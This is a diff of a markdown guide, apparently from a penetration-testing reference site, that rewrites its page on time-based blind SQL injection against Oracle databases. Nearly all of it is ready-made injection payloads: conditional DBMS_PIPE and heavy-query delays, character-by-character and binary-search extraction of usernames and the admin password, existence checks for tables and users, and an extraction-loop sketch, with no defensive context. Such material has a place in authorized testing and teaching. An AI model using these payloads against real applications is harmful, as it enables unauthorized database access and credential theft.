@@ -4,176 +4,112 @@ description: Using time-based techniques for Oracle SQL injection attacks
 category: Injection Techniques
 order: 11
 tags: ["timing", "blind injection", "delay", "time-based"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
-Time-based techniques are essential for extracting information in blind SQL injection scenarios where no direct output is visible. By introducing deliberate delays based on conditions, attackers can infer data by measuring the response time of the application.
+Time-based techniques extract data when the application shows no output and no difference between true and false conditions. The payload delays the response only when a condition is true, and the attacker measures the response time.
 
-## Oracle Delay Functions
+An `AND` payload only runs when the original condition is true: Oracle skips the rest of an `AND` once the first part is false. The examples inject after a valid value (`admin'`); with no known value, use an `OR` form instead.
 
-Oracle provides several methods to introduce delays:
+## Delay Methods
 
-| Method                        | Description                            | Example                                                          | Privileges Required   |
-| ----------------------------- | -------------------------------------- | ---------------------------------------------------------------- | --------------------- |
-| `DBMS_PIPE.RECEIVE_MESSAGE`   | Waits for a message in a pipe          | `DBMS_PIPE.RECEIVE_MESSAGE('nonexistent', 10)`                   | EXECUTE on DBMS_PIPE  |
-| `DBMS_LOCK.SLEEP`             | Suspends session for specified seconds | `DBMS_LOCK.SLEEP(10)`                                            | EXECUTE on DBMS_LOCK  |
-| `UTL_INADDR.GET_HOST_ADDRESS` | DNS resolution delay                   | `UTL_INADDR.GET_HOST_ADDRESS('nonexistent-domain.com')`          | EXECUTE on UTL_INADDR |
-| `UTL_HTTP.REQUEST`            | HTTP request delay                     | `UTL_HTTP.REQUEST('http://slow-website.com')`                    | EXECUTE on UTL_HTTP   |
-| Heavy queries                 | CPU/IO intensive operations            | `SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c` | Basic SELECT          |
+| Method                        | Kind      | Usable in a SELECT | Privileges                                           |
+| ----------------------------- | --------- | ------------------ | ---------------------------------------------------- |
+| `DBMS_PIPE.RECEIVE_MESSAGE`   | Function  | Yes                | EXECUTE on `DBMS_PIPE` (often not granted to PUBLIC) |
+| Heavy query                   | Query     | Yes                | None beyond the visible data dictionary              |
+| `UTL_INADDR.GET_HOST_ADDRESS` | Function  | Yes                | EXECUTE on `UTL_INADDR` and a network ACL            |
+| `UTL_HTTP.REQUEST`            | Function  | Yes                | EXECUTE on `UTL_HTTP` and a network ACL              |
+| `DBMS_SESSION.SLEEP`          | Procedure | No, PL/SQL only    | EXECUTE on `DBMS_SESSION` (granted to PUBLIC)        |
+| `DBMS_LOCK.SLEEP`             | Procedure | No, PL/SQL only    | EXECUTE on `DBMS_LOCK` (not granted to PUBLIC)       |
 
-## Basic Time-Based Injection
+`DBMS_LOCK.SLEEP` and `DBMS_SESSION.SLEEP` (Oracle 18c+) are procedures, so they cannot appear in a query: `' AND DBMS_LOCK.SLEEP(5)=0--` fails with `ORA-00904`. They only help when the injection lands inside a PL/SQL block, for example a string passed to `EXECUTE IMMEDIATE 'BEGIN ... END;'`.
+
+`EXECUTE` on `DBMS_PIPE` was not granted to `PUBLIC` on any version tested (11g XE, 18c, 21c, 23ai), so check `ALL_TAB_PRIVS` before relying on it.
+
+Since Oracle 11g, `UTL_INADDR` and `UTL_HTTP` also need a network access control list entry for the database user, so they rarely work from an ordinary application account.
+
+## DBMS_PIPE.RECEIVE_MESSAGE
+
+`DBMS_PIPE.RECEIVE_MESSAGE(pipe, timeout)` waits up to `timeout` seconds for a message on a pipe nobody writes to, then returns `1`:
 
 ```sql
--- Basic time delay (10 seconds)
-' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
+-- Unconditional 5 second delay (a quick test that the function is available)
+admin' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--
 
--- Conditional time delay
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
+-- Delay only when the condition is true
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 ```
 
-## Using DBMS_PIPE.RECEIVE_MESSAGE
+## Heavy Queries
 
-This is the most commonly used delay function in Oracle:
+When no delay function is available, a large cartesian join takes a measurable time. It only runs when the `CASE` branch is taken, because Oracle evaluates scalar subqueries lazily:
 
 ```sql
--- Basic usage
-' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
-
--- Wait for 5 seconds
-' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0--
-
--- Character extraction with time delay
-' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE NULL END) IS NULL--
+-- Several seconds when true, immediate when false
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b) ELSE 0 END)>=0--
 ```
 
-## Using DBMS_LOCK.SLEEP
+The delay depends on how many objects the user can see in `ALL_OBJECTS` and on server load: measure the true and false cases before relying on it, and add a third `all_objects c` with `WHERE ROWNUM <= n` to tune it. A join on a key (`WHERE a.object_id = b.object_id`) is fast and gives no delay.
 
-If you have privileges:
+## Extracting Data
 
 ```sql
--- Basic usage
-' AND DBMS_LOCK.SLEEP(10)=0--
+-- First character of the first username is 'a' (ASCII 97)?
+admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 
--- Extracting data bit by bit
-' AND (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 1)=1 THEN DBMS_LOCK.SLEEP(10) ELSE NULL END) IS NULL--
+-- Second character
+admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),2,1))=100 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 ```
 
-## Heavy Queries for Delay
+### Binary Search
 
-When no delay functions are available:
-
-```sql
--- Join multiple large tables for CPU-intensive operation
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE a.object_id=b.object_id) ELSE 0 END)>=0--
-
--- Hierarchical queries
-' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN (SELECT COUNT(*) FROM all_objects START WITH object_id=1 CONNECT BY PRIOR object_id=object_id) ELSE 0 END)>=0--
-```
-
-## SQL Injection Examples
-
-### Character-by-Character Extraction
+Halving the range each time needs about 7 requests per character instead of up to 95:
 
 ```sql
--- Extract first character of username
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
+-- Is the code above 79?
+admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1))>79 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 
--- Extract second character of username
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),2,1))=98 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
-```
-
-### Binary Search Algorithm
-
-More efficient extraction using binary search:
-
-```sql
--- Test if ASCII value >= 128
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))>=128 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
-
--- Test if ASCII value >= 64 (assuming previous test was false)
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))>=64 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
-
--- Continue narrowing down the range
+-- Bit by bit: is bit 0 set? (BITAND, since Oracle has no & operator)
+admin' AND (CASE WHEN BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1)),1)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 ```
 
 ### Testing for Existence
 
 ```sql
--- Check if table exists
-' AND (CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
+-- Does a table named USERS exist?
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 
--- Check if specific user exists
-' AND (CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--
-```
-
-## Alternative Delay Techniques
-
-### Using UTL_INADDR
-
-If DBMS_PIPE is not available:
-
-```sql
--- Causing delay with DNS resolution
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_INADDR.GET_HOST_ADDRESS('nonexistent-subdomain.'||(SELECT DBMS_RANDOM.STRING('L',20) FROM DUAL)||'.example.com') ELSE '127.0.0.1' END) IS NOT NULL--
-```
-
-### Using UTL_HTTP
-
-```sql
--- HTTP request delay
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN UTL_HTTP.REQUEST('http://slow-website.com') ELSE UTL_HTTP.REQUEST('http://fast-website.com') END) IS NOT NULL--
-```
-
-### Using XML Processing
-
-```sql
--- XML parsing delay
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN SYS.XMLTYPE.CREATEXML('<xml>'||(SELECT RPAD('a',4000,'a') FROM DUAL)||'</xml>') ELSE NULL END) IS NOT NULL--
-```
-
-## Managing Timeout Risks
-
-Application or database timeouts can interrupt time-based extraction:
-
-```sql
--- Using shorter delays (1-2 seconds)
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',2) ELSE NULL END) IS NULL--
-
--- Gradual increasing delays
-' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',1) ELSE NULL END) IS NULL--
+-- Does the user 'admin' exist?
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
 ```
 
 ## Combining with Other Techniques
 
 ```sql
--- Combining time-based with error-based
-' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE TO_CHAR(1/0) END) IS NULL--
+-- Delay when true, error when false: both outcomes are visible
+admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1/0 END)>=0--
 
--- Combining time-based with UNION
-' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') > 0 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 'b' END, NULL FROM DUAL--
+-- Inside a UNION query (two-column example)
+' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='s')>0 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 'b' END, NULL FROM dual--
 ```
 
 ## Practical Considerations
 
-### Measuring Response Time
+1. Measure the normal response time first, and use delays well above its variance (3-5 seconds)
+2. Repeat a request when a result looks borderline
+3. Keep delays short enough to stay under application and proxy timeouts
+4. A tool such as sqlmap automates this: it tries each technique, calibrates delays and uses binary search
 
-For effective time-based extraction:
+An extraction loop, in pseudo-code:
 
-1. Establish a baseline for normal response time
-2. Use delays significantly larger than normal variance (at least 3-5 seconds)
-3. Make multiple requests to confirm results
-4. Consider network latency and server load variations
-
-### Automating Extraction
-
-Use automation tools for efficient extraction:
-
-```sql
--- Example of script logic (pseudo-code)
-for position in 1..20:
-    for char_value in 32..127:
-        inject "' AND (CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),$position,1))=$char_value THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) IS NULL--"
-        if response_time > 5 seconds:
-            extracted_char = char(char_value)
-            break
+```text
+for position in 1..length:
+    low, high = 32, 126
+    while low < high:
+        mid = (low + high) / 2
+        if request("... ASCII(SUBSTR(secret, position, 1)) > mid ...") is slow:
+            low = mid + 1
+        else:
+            high = mid
+    secret[position] = chr(low)
 ```
